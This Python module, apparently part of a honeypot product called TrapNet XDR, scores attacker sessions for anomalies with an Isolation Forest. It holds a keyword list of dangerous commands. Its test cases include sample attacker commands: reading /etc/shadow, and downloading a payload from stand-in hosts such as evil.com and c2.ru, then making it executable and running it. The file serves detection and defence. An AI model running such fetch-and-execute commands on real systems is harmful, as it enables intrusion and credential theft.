"""
TrapNet XDR — ML Anomaly Detection Module
Uses Isolation Forest (unsupervised) — no labeled data required.
"""

import numpy as np
from sklearn.ensemble import IsolationForest
from sklearn.preprocessing import StandardScaler
import json, random

# ─── Feature Extraction ───────────────────────────────────────────────────────

FEATURE_NAMES = [
    "login_attempts",       # Number of login attempts
    "unique_usernames",     # Distinct usernames tried
    "unique_passwords",     # Distinct passwords tried
    "commands_executed",    # Shell commands run
    "dangerous_commands",   # wget/curl/rm -rf etc.
    "session_duration_s",   # Time spent in session
    "request_rate",         # Requests per minute
    "entropy_score",        # Shannon entropy of credentials
]

DANGEROUS_KEYWORDS = ["wget", "curl", "rm -rf", "/etc/shadow", "cron", "nmap", "dd if=", "chmod +x"]

def shannon_entropy(text: str) -> float:
    if not text:
        return 0.0
    freq = {}
    for c in text:
        freq[c] = freq.get(c, 0) + 1
    n = len(text)
    return -sum((v/n) * np.log2(v/n) for v in freq.values())

def extract_features(session: dict) -> np.ndarray:
    """Extract 8 behavioral features from a session dict."""
    attempts = session.get("attempts", 1)
    usernames = session.get("usernames", [session.get("username", "")])
    passwords = session.get("passwords", [session.get("password", "")])
    commands = session.get("commands", [])
    duration = session.get("duration_s", random.uniform(1, 120))
    rate = attempts / max(duration / 60, 0.1)

    dangerous = sum(1 for c in commands if any(k in c for k in DANGEROUS_KEYWORDS))
    avg_entropy = np.mean([shannon_entropy(u + p) for u, p in zip(usernames, passwords)]) if usernames else 0

    return np.array([
        attempts,
        len(set(usernames)),
        len(set(passwords)),
        len(commands),
        dangerous,
        duration,
        rate,
        avg_entropy,
    ], dtype=float)

# ─── Model ────────────────────────────────────────────────────────────────────

class TrapNetMLModel:
    def __init__(self):
        self.scaler = StandardScaler()
        self.model = IsolationForest(
            n_estimators=200,
            contamination=0.05,
            random_state=42,
            max_samples="auto",
        )
        self.fitted = False
        self._train_on_synthetic()

    def _train_on_synthetic(self):
        """Train on synthetic normal traffic so model is ready immediately."""
        normal = []
        for _ in range(500):
            normal.append([
                random.randint(1, 3),       # Low attempts
                random.randint(1, 2),
                random.randint(1, 2),
                0,                          # No commands
                0,
                random.uniform(10, 300),
                random.uniform(0.1, 2),
                random.uniform(1, 3),
            ])
        X = np.array(normal)
        X_scaled = self.scaler.fit_transform(X)
        self.model.fit(X_scaled)
        self.fitted = True
        print("[TrapNet ML] Model trained on 500 synthetic sessions. Ready.")

    def predict(self, session: dict) -> dict:
        features = extract_features(session).reshape(1, -1)
        features_scaled = self.scaler.transform(features)
        raw_score = self.model.score_samples(features_scaled)[0]  # More negative = more anomalous
        prediction = self.model.predict(features_scaled)[0]       # -1 = anomaly, 1 = normal

        # Normalize to 0–100 risk score (raw scores typically -0.8 to 0.2)
        normalized = max(0, min(100, int((-raw_score - 0.05) * 200)))

        level = (
            "CRITICAL" if normalized >= 75 else
            "HIGH"     if normalized >= 50 else
            "MEDIUM"   if normalized >= 25 else
            "LOW"
        )

        factors = []
        feats = extract_features(session)
        if feats[0] > 10: factors.append(f"High attempt count: {int(feats[0])}")
        if feats[3] > 0:  factors.append(f"Commands executed: {int(feats[3])}")
        if feats[4] > 0:  factors.append(f"Dangerous commands: {int(feats[4])}")
        if feats[6] > 10: factors.append(f"High request rate: {feats[6]:.1f}/min")

        return {
            "risk_score": normalized,
            "risk_level": level,
            "is_anomaly": prediction == -1,
            "raw_score": round(float(raw_score), 4),
            "factors": factors,
            "features": dict(zip(FEATURE_NAMES, [round(float(f), 2) for f in feats])),
        }

    def partial_fit(self, new_sessions: list):
        """Retrain with new session data added."""
        if not new_sessions:
            return
        X_new = np.array([extract_features(s) for s in new_sessions])
        X_all = self.scaler.transform(X_new)
        self.model.fit(X_all)
        print(f"[TrapNet ML] Retrained with {len(new_sessions)} new sessions.")

# Singleton
_model = None
def get_model():
    global _model
    if _model is None:
        _model = TrapNetMLModel()
    return _model

if __name__ == "__main__":
    model = get_model()
    test_cases = [
        {"username": "admin", "password": "admin", "attempts": 1, "commands": [], "duration_s": 2},
        {"username": "root",  "password": "toor",  "attempts": 25, "commands": ["whoami","cat /etc/shadow","wget http://evil.com/bot"], "duration_s": 45},
        {"username": "user",  "password": "pass",  "attempts": 50, "commands": ["id","uname -a","curl http://c2.ru/payload -o /tmp/x","chmod +x /tmp/x","/tmp/x"], "duration_s": 120},
    ]
    for t in test_cases:
        result = model.predict(t)
        print(f"\n[{result['risk_level']}] Score={result['risk_score']} | Anomaly={result['is_anomaly']} | {result['factors']}")
